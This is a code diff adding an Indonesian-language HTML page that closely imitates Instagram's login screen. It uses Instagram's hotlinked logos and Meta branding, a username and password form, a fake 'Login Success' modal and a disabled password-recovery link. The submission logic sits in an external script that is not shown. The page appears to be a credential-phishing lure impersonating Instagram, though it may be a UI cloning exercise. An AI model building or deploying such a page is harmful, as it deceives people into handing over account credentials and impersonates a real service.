@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/yr/r/rzWiSjZRxk5.webp">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body class="min-h-screen flex justify-center lg:justify-between bg-[#1f2a33] lg:bg-[#000000] overflow-x-hidden w-full">
+
+    <!-- ========================================== -->
+    <!-- LEFT SECTION (DESKTOP ONLY)                -->
+    <!-- ========================================== -->
+    <div class="hidden lg:flex flex-col flex-1 relative min-h-screen items-center justify-between pb-6 pt-10">
+
+        <!-- IG Logo (Top Left) -->
+        <div class="absolute top-10 left-10">
+            <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram"
+                class="w-[48px] h-[48px] object-contain cursor-pointer">
+        </div>
+
+        <!-- Center Content (Text & Collage Image) -->
+        <div class="flex-1 flex flex-col items-center justify-center mt-6 w-full max-w-2xl px-6">
+            <h1 class="text-[26px] xl:text-[30px] font-medium mb-10 text-center leading-tight tracking-wide">
+                Lihat momen sehari-hari dari <br>
+                <span class="text-transparent bg-clip-text bg-gradient-to-r from-[#ff7a00] to-[#ff0069]">teman
+                    dekat</span> Anda.
+            </h1>
+            <div class="relative w-full flex justify-center">
+                <!-- Collage Asset -->
+                <img src="https://static.cdninstagram.com/rsrc.php/yR/r/92ZsVHNkyvf.webp" alt="Collage"
+                    class="w-full max-w-[500px] object-contain drop-shadow-2xl hover:scale-[1.01] transition-transform duration-500">
+            </div>
+        </div>
+
+        <!-- Footer (Desktop Bottom) -->
+        <footer class="w-full text-[#737373] text-[12.5px] flex flex-col items-center px-10 mt-10">
+            <div class="flex flex-wrap justify-center gap-x-4 gap-y-3 mb-4 max-w-3xl">
+                <a href="#" class="hover:underline">Meta</a>
+                <a href="#" class="hover:underline">Tentang</a>
+                <a href="#" class="hover:underline">Blog</a>
+                <a href="#" class="hover:underline">Pekerjaan</a>
+                <a href="#" class="hover:underline">Bantuan</a>
+                <a href="#" class="hover:underline">API</a>
+                <a href="#" class="hover:underline">Privasi</a>
+                <a href="#" class="hover:underline">Ketentuan</a>
+                <a href="#" class="hover:underline">Lokasi</a>
+                <a href="#" class="hover:underline">Instagram Lite</a>
+                <a href="#" class="hover:underline">Threads</a>
+                <a href="#" class="hover:underline">Pengunggahan Kontak & Non-Pengguna</a>
+                <a href="#" class="hover:underline">Meta Verified</a>
+            </div>
+            <div class="flex items-center gap-4">
+                <span class="cursor-pointer hover:underline flex items-center gap-1">
+                    Bahasa Indonesia
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2"
+                        stroke="currentColor" class="w-3 h-3">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5" />
+                    </svg>
+                </span>
+                <span>© 2024 Instagram from Meta</span>
+            </div>
+        </footer>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- RIGHT SECTION (LOGIN FORM - ALL VIEWPORTS) -->
+    <!-- ========================================== -->
+    <main
+        class="w-full max-w-[420px] lg:max-w-none lg:w-[420px] xl:w-[450px] min-h-screen flex flex-col justify-between px-5 py-4 relative lg:border-l lg:border-[#262626] bg-[#1f2a33] lg:bg-[#0a0a0a] shadow-2xl mx-auto lg:mx-0">
+
+        <!-- Internal wrapper to vertically center content on desktop -->
+        <div class="w-full h-full flex flex-col max-w-[360px] mx-auto">
+
+            <!-- Mobile Header (Back Arrow & Language) -->
+            <header class="w-full flex flex-col items-center relative mt-1 lg:hidden">
+                <button class="absolute left-0 top-0 text-white hover:text-gray-300 transition-colors p-1 -ml-1">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5"
+                        stroke="currentColor" class="w-[22px] h-[22px]">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 19.5 8.25 12l7.5-7.5" />
+                    </svg>
+                </button>
+                <span class="text-[13px] text-[#8e9aab] cursor-pointer hover:text-gray-100 transition-colors mt-12">
+                    Bahasa Indonesia
+                </span>
+            </header>
+
+            <!-- Form Center Area -->
+            <div class="flex-grow flex flex-col justify-center w-full mt-[-80px] lg:mt-0">
+
+                <!-- Desktop Header (Back Arrow & Login Title) -->
+                <div class="hidden lg:flex items-center gap-3 w-full mb-8 pt-10">
+                    <button
+                        class="text-white hover:text-gray-300 transition-colors p-1 -ml-2 rounded-full hover:bg-white/10">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5"
+                            stroke="currentColor" class="w-[22px] h-[22px]">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 19.5 8.25 12l7.5-7.5" />
+                        </svg>
+                    </button>
+                    <h2 class="font-semibold text-[16px]">Login ke Instagram</h2>
+                </div>
+
+                <!-- IG Logo (Mobile Only) -->
+                <div class="mb-14 flex justify-center lg:hidden">
+                    <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram Logo"
+                        class="w-[60px] h-[60px] object-contain">
+                </div>
+
+                <!-- Form Input Fields -->
+                <form id="loginForm" class="w-full flex flex-col gap-3">
+
+                    <!-- Username Input -->
+                    <div
+                        class="relative w-full input-container border border-[#445464] lg:border-[#363636] lg:bg-[#121212] rounded-[14px] bg-transparent focus-within:border-gray-400 transition-colors duration-200">
+                        <input type="text" id="username"
+                            class="w-full bg-transparent pt-6 pb-2 px-4 text-[15px] outline-none text-white block placeholder-transparent"
+                            placeholder=" " required autocomplete="off">
+                        <label for="username"
+                            class="absolute left-4 top-1/2 -translate-y-1/2 text-[15px] text-[#8e9aab] lg:text-[#737373] pointer-events-none transition-all duration-200 ease-out">
+                            Nama pengguna, email, atau nomor ponsel
+                        </label>
+                    </div>
+
+                    <!-- Password Input -->
+                    <div
+                        class="relative w-full input-container border border-[#445464] lg:border-[#363636] lg:bg-[#121212] rounded-[14px] bg-transparent focus-within:border-gray-400 transition-colors duration-200">
+                        <input type="password" id="password"
+                            class="w-full bg-transparent pt-6 pb-2 pl-4 pr-12 text-[15px] outline-none text-white block placeholder-transparent"
+                            placeholder=" " required autocomplete="off">
+                        <label for="password"
+                            class="absolute left-4 top-1/2 -translate-y-1/2 text-[15px] text-[#8e9aab] lg:text-[#737373] pointer-events-none transition-all duration-200 ease-out">
+                            Kata sandi
+                        </label>
+
+                        <!-- Toggle Show/Hide Password -->
+                        <button type="button" id="togglePassword"
+                            class="absolute right-4 top-1/2 -translate-y-1/2 text-[#8e9aab] hover:text-white transition-colors focus:outline-none">
+                            <svg id="eyeSlash" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                                stroke-width="1.8" stroke="currentColor" class="w-[22px] h-[22px]">
+                                <path stroke-linecap="round" stroke-linejoin="round"
+                                    d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" />
+                            </svg>
+                            <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                                stroke-width="1.8" stroke="currentColor" class="w-[22px] h-[22px] hidden">
+                                <path stroke-linecap="round" stroke-linejoin="round"
+                                    d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z" />
+                                <path stroke-linecap="round" stroke-linejoin="round"
+                                    d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
+                            </svg>
+                        </button>
+                    </div>
+
+                    <!-- Login Button -->
+                    <button type="submit" id="loginBtn"
+                        class="w-full bg-[#0064e0] hover:bg-[#0057c2] text-white rounded-full py-3 mt-1 font-semibold text-[15px] transition-all duration-200 opacity-60 pointer-events-none">
+                        Login
+                    </button>
+
+                    <!-- Forgot Password -->
+                    <div class="w-full text-center mt-2">
+                        <a href="#" id="forgotPasswordLink" class="text-[14px] text-white font-medium hover:text-gray-300 transition-colors">
+                            Lupa kata sandi?
+                        </a>
+                    </div>
+                </form>
+
+                <!-- Facebook Login (Desktop Only) -->
+                <div class="hidden lg:flex w-full mt-6">
+                    <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DAc3c2s3b5H0s6f4c-b72i6c2j8fZcp3o5oN5j4nRkE2q5z2y8a9j2s7f4n6m0n7o8p9q0r1t2u3v4w5x6y7z8"
+                        class="w-full flex justify-center items-center gap-2 border border-[#445464] lg:border-[#363636] text-[#4cb5f9] font-medium text-[15px] rounded-full py-2.5 hover:bg-white/5 transition-colors">
+                        <svg viewBox="0 0 24 24" fill="currentColor" class="w-[18px] h-[18px]">
+                            <path
+                                d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+                        </svg>
+                        Login dengan Facebook
+                    </a>
+                </div>
+
+            </div>
+
+            <!-- Bottom Section (Create Account & Meta Logo) -->
+            <div class="w-full flex flex-col items-center pb-4 lg:mt-4">
+                <!-- Create Account Button -->
+                <a href="https://www.instagram.com/accounts/emailsignup"
+                    class="w-full border border-[#445464] lg:border-[#363636] text-[#4cb5f9] font-medium text-[15px] rounded-full py-2.5 text-center hover:bg-white/5 transition-colors mb-6">
+                    Buat akun baru
+                </a>
+
+                <!-- Meta Logo -->
+                <div class="flex justify-center items-center">
+                    <img src="https://static.cdninstagram.com/rsrc.php/yU/r/u_xNYO0VfQm.webp" alt="Meta"
+                        class="h-[14px] object-contain opacity-60">
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- ========================================== -->
+    <!-- MODAL LOGIN SUCCESS                        -->
+    <!-- ========================================== -->
+    <div id="modalOverlay" class="modal-overlay hidden">
+        <div class="modal-card">
+            <h3 class="modal-title">Login Success</h3>
+            <p class="modal-message">Selamat! Anda berhasil masuk ke akun Instagram Anda.</p>
+            <div class="modal-actions">
+                <button id="modalOkBtn" class="modal-btn modal-btn-primary">OK</button>
+                <button id="modalTryAgainBtn" class="modal-btn modal-btn-secondary">Try again</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- MODAL ERROR (FORGOT PASSWORD)              -->
+    <!-- ========================================== -->
+    <div id="errorModalOverlay" class="modal-overlay hidden">
+        <div class="modal-card">
+            <h3 class="modal-title">Maaf, Fitur Tidak Tersedia</h3>
+            <p class="modal-message">Fitur lupa kata sandi belum tersedia saat ini. Silakan coba lagi nanti atau hubungi bantuan Instagram.</p>
+            <div class="modal-actions">
+                <button id="errorModalOkBtn" class="modal-btn modal-btn-primary">OK</button>
+                <button id="errorModalTryAgainBtn" class="modal-btn modal-btn-secondary">Try again</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="scripts.js"></script>
+</body>
+
+</html>
